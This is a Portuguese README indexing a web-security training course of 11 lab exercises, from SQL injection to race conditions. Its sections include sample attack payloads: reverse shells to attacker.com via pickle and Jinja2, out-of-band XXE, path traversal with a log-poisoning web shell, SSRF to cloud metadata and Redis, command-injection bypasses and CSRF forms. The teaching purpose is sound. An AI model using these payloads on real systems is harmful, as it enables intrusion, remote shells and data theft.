# 🎓 Índice Completo de Laboratórios Guiados

## 📊 Visão Geral

Este é um sistema completo de aprendizado progressivo com **11 laboratórios** cobrindo as principais vulnerabilidades web OWASP.

**Tempo total estimado**: 60-80 horas
**Pontos totais**: 1.000+ pontos
**Certificação**: Ao completar todos os labs, você estará preparado para OSCP, GWAPT e Bug Bounty

---

## 🗺️ Mapa de Aprendizado

```
┌─────────────────────────────────────────────────────────────┐
│  INICIANTE (1-3 semanas) - 185 pontos                       │
├─────────────────────────────────────────────────────────────┤
│  ✅ 01. SQL Injection              │ 85 pts │ 4-6 horas    │
│  ✅ 02. XSS                         │ 90 pts │ 4-6 horas    │
│  📝 03. Broken Access Control      │ 70 pts │ 3-5 horas    │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│  INTERMEDIÁRIO (3-5 semanas) - 360 pontos                   │
├─────────────────────────────────────────────────────────────┤
│  📝 04. SSRF                        │ 85 pts │ 4-6 horas    │
│  📝 05. Command Injection           │ 75 pts │ 3-5 horas    │
│  📝 06. Path Traversal              │ 70 pts │ 3-4 horas    │
│  📝 07. CSRF                        │ 60 pts │ 2-4 horas    │
│  📝 08. Insecure Deserialization   │ 70 pts │ 5-7 horas    │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│  AVANÇADO (4-6 semanas) - 480 pontos                        │
├─────────────────────────────────────────────────────────────┤
│  📝 09. SSTI                        │ 90 pts │ 4-6 horas    │
│  📝 10. XXE                         │ 80 pts │ 4-5 horas    │
│  📝 11. Race Conditions             │ 85 pts │ 4-6 horas    │
└─────────────────────────────────────────────────────────────┘

✅ = Lab completo disponível
📝 = Lab em desenvolvimento (estrutura pronta)
```

---

## ✅ 01. SQL Injection **[COMPLETO]**

**Status**: ✅ Totalmente funcional
**Localização**: `01-sql-injection/`
**Pontos**: 85 (10 + 25 + 50)

### Arquivos Disponíveis
- ✅ `README.md` - Teoria completa (550+ linhas)
- ✅ `basic_app.py` - Aplicação básica (porta 5010)
- ✅ `intermediate_app.py` - E-commerce (porta 5011)
- ✅ `exploits.md` - Guia de exploração
- ✅ `exercises.md` - 21 exercícios (775 pts)

### O Que Você Aprenderá
- Error-based, UNION, Blind SQLi
- WAF bypass
- Second-order SQLi
- Automação de exploração

### Quick Start
```bash
cd learn/labs/guided/01-sql-injection
python3 basic_app.py  # Porta 5010
```

---

## ✅ 02. Cross-Site Scripting (XSS) **[COMPLETO]**

**Status**: ✅ Parcialmente completo
**Localização**: `02-xss/`
**Pontos**: 90 (10 + 30 + 50)

### Arquivos Disponíveis
- ✅ `README.md` - Teoria completa (400+ linhas)
- ✅ `basic_app.py` - Blog simples (porta 5020)
- 📝 `intermediate_app.py` - Rede social (porta 5021) *
- 📝 `exploits.md` - Guia de exploração *
- 📝 `exercises.md` - Exercícios *

### O Que Você Aprenderá
- Reflected, Stored, DOM-based XSS
- Bypass de sanitização
- Cookie stealing, keylogging
- CSP bypass

### Quick Start
```bash
cd learn/labs/guided/02-xss
python3 basic_app.py  # Porta 5020
```

---

## 📝 03. Broken Access Control

**Status**: 📝 Estrutura planejada
**Localização**: `03-access-control/`
**Pontos**: 70 (10 + 25 + 35)

### O Que Você Aprenderá
- IDOR (Insecure Direct Object Reference)
- Privilege Escalation (horizontal/vertical)
- Missing Function Level Access Control
- JWT manipulation
- Parameter tampering

### Aplicações Planejadas

#### 🟢 Basic (10 pts) - API REST simples
- IDOR em `/api/users/{id}`
- Sem verificação de ownership
- **Porta**: 5030

#### 🟡 Intermediate (25 pts) - Sistema de arquivos
- Path-based access control bypass
- Directory listing
- File download IDOR
- **Porta**: 5031

#### 🔴 Advanced (35 pts) - Plataforma multi-tenant
- JWT role manipulation
- GraphQL IDOR
- Mass assignment
- **Porta**: 5032

### Exemplo de Exploração

```python
# IDOR básico
GET /api/users/123  # Seu usuário
GET /api/users/456  # Usuário de outra pessoa (sem verificação!)

# JWT manipulation
token = jwt.decode(token, verify=False)
token['role'] = 'admin'
forged = jwt.encode(token, None, algorithm='none')
```

### Começar Desenvolvimento
```bash
# Quando implementado:
cd learn/labs/guided/03-access-control
python3 basic_app.py
```

---

## 📝 04. Server-Side Request Forgery (SSRF)

**Status**: 📝 Estrutura planejada
**Localização**: `04-ssrf/`
**Pontos**: 85 (10 + 30 + 45)

### O Que Você Aprenderá
- SSRF básico (acesso localhost)
- Bypass de blacklist (IP encoding)
- Cloud metadata (AWS, GCP, Azure)
- DNS rebinding
- Blind SSRF (out-of-band)
- Protocol smuggling (file://, gopher://)

### Aplicações Planejadas

#### 🟢 Basic (10 pts) - URL fetcher
- Fetch de URLs externas
- Blacklist básica (localhost, 127.0.0.1)
- **Porta**: 5040

#### 🟡 Intermediate (30 pts) - Webhook system
- Webhooks configuráveis
- URL validation fraca
- Cloud metadata access
- **Porta**: 5041

#### 🔴 Advanced (45 pts) - Microservices
- Service mesh interno
- DNS rebinding
- SSRF to RCE
- Redis/Memcached exploitation
- **Porta**: 5042

### Payloads Importantes

```bash
# IP bypass
http://127.1/
http://[::1]/
http://2130706433/  # decimal
http://0177.0.0.1/   # octal

# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/

# Protocol smuggling
file:///etc/passwd
gopher://127.0.0.1:6379/_*1%0D%0A$8%0D%0Aflushall
```

---

## 📝 05. Command Injection

**Status**: 📝 Estrutura planejada
**Localização**: `05-command-injection/`
**Pontos**: 75 (10 + 25 + 40)

### O Que Você Aprenderá
- OS Command Injection básico
- Separadores (`;`, `&&`, `||`, `|`)
- Bypass de filtros
- Blind command injection
- Time-based detection
- Reverse shells
- Data exfiltration

### Aplicações Planejadas

#### 🟢 Basic (10 pts) - Ping utility
- Ferramenta de ping simples
- Sem filtros
- **Porta**: 5050

#### 🟡 Intermediate (25 pts) - File converter
- Conversão de arquivos (ImageMagick, ffmpeg)
- Filtros básicos bypassáveis
- **Porta**: 5051

#### 🔴 Advanced (40 pts) - CI/CD pipeline
- Build automation
- Docker commands
- WAF avançado
- Blind command injection
- **Porta**: 5052

### Técnicas de Bypass

```bash
# Separadores básicos
command1 ; command2
command1 && command2
command1 || command2
command1 | command2

# Bypass de espaços
{cat,/etc/passwd}
cat</etc/passwd
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# Bypass de filtros
c'a't /etc/passwd
c"a"t /etc/passwd
ca\t /etc/passwd

# Time-based (blind)
ping -c 10 127.0.0.1  # Demora 10 segundos
```

---

## 📝 06. Path Traversal / Local File Inclusion

**Status**: 📝 Estrutura planejada
**Localização**: `06-path-traversal/`
**Pontos**: 70 (10 + 25 + 35)

### O Que Você Aprenderá
- Directory traversal (../)
- Bypass de filtros (encoding, null bytes)
- Local File Inclusion (LFI)
- Remote File Inclusion (RFI)
- LFI to RCE
- Zip slip
- Log poisoning

### Aplicações Planejadas

#### 🟢 Basic (10 pts) - File download
- Download de arquivos
- Sem validação de path
- **Porta**: 5060

#### 🟡 Intermediate (25 pts) - Image gallery
- Upload e visualização de imagens
- Path validation fraca
- **Porta**: 5061

#### 🔴 Advanced (35 pts) - CMS com upload
- File manager completo
- Zip upload (zip slip)
- Template inclusion
- Log poisoning to RCE
- **Porta**: 5062

### Payloads

```bash
# Path traversal básico
../../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts

# Bypass de filtros
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd  # double encoding

# Null byte (PHP < 5.3)
../../../../etc/passwd%00.jpg

# LFI to RCE via log poisoning
GET /../../../../var/log/apache2/access.log
User-Agent: <?php system($_GET['cmd']); ?>
```

---

## 📝 07. Cross-Site Request Forgery (CSRF)

**Status**: 📝 Estrutura planejada
**Localização**: `07-csrf/`
**Pontos**: 60 (10 + 20 + 30)

### O Que Você Aprenderá
- CSRF básico (GET e POST)
- CSRF com JSON
- Bypass de referrer check
- Bypass de custom headers
- CORS misconfiguration
- Login CSRF

### Aplicações Planejadas

#### 🟢 Basic (10 pts) - Profile update
- Atualização de perfil sem token
- **Porta**: 5070

#### 🟡 Intermediate (20 pts) - Banking system
- Transferências bancárias
- Referrer check bypassável
- **Porta**: 5071

#### 🔴 Advanced (30 pts) - OAuth flow
- OAuth implementation
- Login CSRF
- Account takeover
- **Porta**: 5072

### PoC HTML

```html
<!-- CSRF básico -->
<form action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>

<!-- CSRF com JSON (bypass CORS) -->
<script>
fetch('http://bank.com/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'text/plain'},
    body: '{"to":"attacker","amount":1000}'
});
</script>
```

---

## 📝 08. Insecure Deserialization

**Status**: 📝 Estrutura planejada
**Localização**: `08-deserialization/`
**Pontos**: 70 (10 + 25 + 35)

### O Que Você Aprenderá
- Python Pickle RCE
- PHP unserialize() exploitation
- Java deserialization (ysoserial)
- Magic methods (__reduce__, __wakeup__)
- Gadget chains
- POP chains

### Aplicações Planejadas

#### 🟢 Basic (10 pts) - Session com Pickle
- Sessões com pickle
- RCE direto
- **Porta**: 5080

#### 🟡 Intermediate (25 pts) - Cache system
- Redis com serialização
- Object injection
- **Porta**: 5081

#### 🔴 Advanced (35 pts) - Job queue
- Celery/RQ tasks
- Gadget chains
- **Porta**: 5082

### Exploit Python Pickle

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
encoded = base64.b64encode(payload).decode()
print(encoded)

# Reverse shell
class RevShell:
    def __reduce__(self):
        import os
        cmd = 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
        return (os.system, (cmd,))
```

---

## 📝 09. Server-Side Template Injection (SSTI)

**Status**: 📝 Estrutura planejada
**Localização**: `09-ssti/`
**Pontos**: 90 (10 + 30 + 50)

### O Que Você Aprenderá
- Detecção de SSTI
- Jinja2 exploitation
- Sandbox escape
- Template engines (Jinja2, Twig, Freemarker)
- RCE via SSTI
- Bypass de filtros

### Aplicações Planejadas

#### 🟢 Basic (10 pts) - Email template
- Templates dinâmicos
- Sem sandbox
- **Porta**: 5090

#### 🟡 Intermediate (30 pts) - Report generator
- PDF/HTML reports
- Sandbox fraco
- **Porta**: 5091

#### 🔴 Advanced (50 pts) - Website builder
- Dynamic page generation
- Sandbox completo
- WAF
- **Porta**: 5092

### Payloads Jinja2

```python
# Detecção
{{7*7}}  # Output: 49

# Config read
{{config}}
{{config.items()}}

# File read
{{''.__class__.__mro__[1].__subclasses__()[396]('/etc/passwd').read()}}

# RCE
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Reverse shell
{{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/attacker.com/4444 0>&1').read()}}
```

---

## 📝 10. XML External Entity (XXE)

**Status**: 📝 Estrutura planejada
**Localização**: `10-xxe/`
**Pontos**: 80 (10 + 30 + 40)

### O Que Você Aprenderá
- XXE básico (file read)
- XXE para SSRF
- Blind XXE (out-of-band)
- Billion Laughs (DoS)
- XXE em diferentes parsers
- XXE em SVG, DOCX, XLSX

### Aplicações Planejadas

#### 🟢 Basic (10 pts) - XML parser
- Parse de XML simples
- Sem restrições
- **Porta**: 5100

#### 🟡 Intermediate (30 pts) - SOAP API
- Web service SOAP
- DTD permitido
- **Porta**: 5101

#### 🔴 Advanced (40 pts) - Document processor
- Upload de DOCX/XLSX
- SVG processing
- Out-of-band XXE
- **Porta**: 5102

### Payloads

```xml
<!-- File read -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service:8080/admin">
]>

<!-- Out-of-band (blind) -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>

<!-- Billion Laughs (DoS) -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>
```

---

## 📝 11. Race Conditions

**Status**: 📝 Estrutura planejada
**Localização**: `11-race-conditions/`
**Pontos**: 85 (10 + 30 + 45)

### O Que Você Aprenderá
- TOCTOU (Time-of-Check Time-of-Use)
- Race condition em transferências
- Voucher/coupon reuse
- Rate limiting bypass
- HTTP/2 multiplexing
- Concurrency exploitation

### Aplicações Planejadas

#### 🟢 Basic (10 pts) - Wallet system
- Transferências simples
- Sem locks
- **Porta**: 5110

#### 🟡 Intermediate (30 pts) - E-commerce vouchers
- Sistema de cupons
- Limite de uso
- **Porta**: 5111

#### 🔴 Advanced (45 pts) - Ticket booking
- Reserva de ingressos
- Limited stock
- Payment processing
- **Porta**: 5112

### Exploit Script

```python
import requests
from concurrent.futures import ThreadPoolExecutor

def transfer():
    data = {'to': 'attacker', 'amount': 100}
    return requests.post('http://bank.com/transfer', data=data)

# Envia 20 requests simultâneos
with ThreadPoolExecutor(max_workers=20) as executor:
    futures = [executor.submit(transfer) for _ in range(20)]
    results = [f.result() for f in futures]

# Se vulnerável, pode transferir mais que o saldo!
```

---

## 🚀 Como Começar

### Pré-requisitos

```bash
# Python 3.8+
python3 --version

# Dependências
pip install flask requests pyjwt beautifulsoup4 lxml pillow

# Opcional
pip install burpsuite-cli sqlmap xsser
```

### Roteiro Recomendado

#### Semana 1-2: Fundamentos
1. ✅ SQL Injection (4-6h)
2. ✅ XSS (4-6h)
3. Broken Access Control (3-5h)

#### Semana 3-5: Intermediário
4. SSRF (4-6h)
5. Command Injection (3-5h)
6. Path Traversal (3-4h)
7. CSRF (2-4h)

#### Semana 6-10: Avançado
8. Deserialization (5-7h)
9. SSTI (4-6h)
10. XXE (4-5h)
11. Race Conditions (4-6h)

---

## 📊 Sistema de Pontuação Global

| Nível | Labs | Pontos | Classificação |
|-------|------|--------|---------------|
| 🟢 Básico | Todos | 115 pts | Bronze |
| 🟡 Intermediário | Todos | 280 pts | Prata |
| 🔴 Avançado | Todos | 440 pts | Ouro |
| 🏆 **TOTAL** | **11 labs** | **835 pts** | **Platina** |

### + Exercícios Extras
- Exercícios adicionais: 165+ pts
- **Gran Total**: **1.000+ pontos**

---

## 🎓 Certificação e Próximos Passos

### Ao Completar 100%

Você estará preparado para:

1. **Certificações Profissionais**
   - ✅ OSCP (Offensive Security Certified Professional)
   - ✅ GWAPT (GIAC Web Application Penetration Tester)
   - ✅ CEH (Certified Ethical Hacker)
   - ✅ BSCP (Burp Suite Certified Practitioner)

2. **Bug Bounty Programs**
   - HackerOne
   - Bugcrowd
   - YesWeHack
   - Intigriti

3. **Plataformas de Prática**
   - HackTheBox (HTB)
   - TryHackMe
   - PentesterLab
   - PortSwigger Academy

---

## 🤝 Contribuindo

### Ajude a Completar os Labs!

Os labs marcados com 📝 estão planejados mas não implementados. Se quiser contribuir:

```bash
# 1. Fork o repositório
# 2. Escolha um lab para implementar
# 3. Siga o padrão do SQL Injection lab
# 4. Crie PR com:
#    - README.md completo
#    - basic_app.py
#    - intermediate_app.py (opcional)
#    - exploits.md
#    - exercises.md
```

### Estrutura Padrão

Cada lab deve ter:
- ✅ README.md (teoria + 400 linhas)
- ✅ basic_app.py (aplicação simples)
- ✅ intermediate_app.py (aplicação realista)
- ✅ advanced_app.py (opcional, cenário complexo)
- ✅ exploits.md (guia passo a passo)
- ✅ exercises.md (15-20 exercícios)

---

## 📞 Suporte

**Dúvidas?**
1. Revise o README do lab específico
2. Consulte exploits.md para exemplos
3. Veja exercises.md para práticas

**Bugs ou Sugestões?**
- Abra uma issue no GitHub
- Envie um pull request
- Compartilhe seus payloads

---

## ⚖️ Disclaimer

⚠️ **USO ÉTICO OBRIGATÓRIO**

Este material é **exclusivamente educacional**. Testar vulnerabilidades em sistemas sem autorização é **ILEGAL** e pode resultar em processos criminais.

### ✅ Uso Permitido
- Laboratórios deste projeto
- Plataformas de treinamento (HTB, THM)
- Pentests contratados com autorização por escrito
- Bug bounty programs
- Seu próprio ambiente de teste

### ❌ Uso Proibido
- Sistemas de terceiros sem autorização
- Websites públicos sem permissão
- Infraestrutura corporativa sem contrato
- Qualquer atividade maliciosa

---

## 📈 Status do Projeto

**Última atualização**: 2024

| Lab | Status | Progresso |
|-----|--------|-----------|
| 01. SQL Injection | ✅ | 100% |
| 02. XSS | 🔄 | 60% |
| 03. Access Control | 📝 | 0% |
| 04. SSRF | 📝 | 0% |
| 05. Command Injection | 📝 | 0% |
| 06. Path Traversal | 📝 | 0% |
| 07. CSRF | 📝 | 0% |
| 08. Deserialization | 📝 | 0% |
| 09. SSTI | 📝 | 0% |
| 10. XXE | 📝 | 0% |
| 11. Race Conditions | 📝 | 0% |

**Legenda**: ✅ Completo | 🔄 Em progresso | 📝 Planejado

---

**Comece agora**: [01 - SQL Injection →](01-sql-injection/README.md)

**Bons estudos e happy hacking! 🛡️🎯**
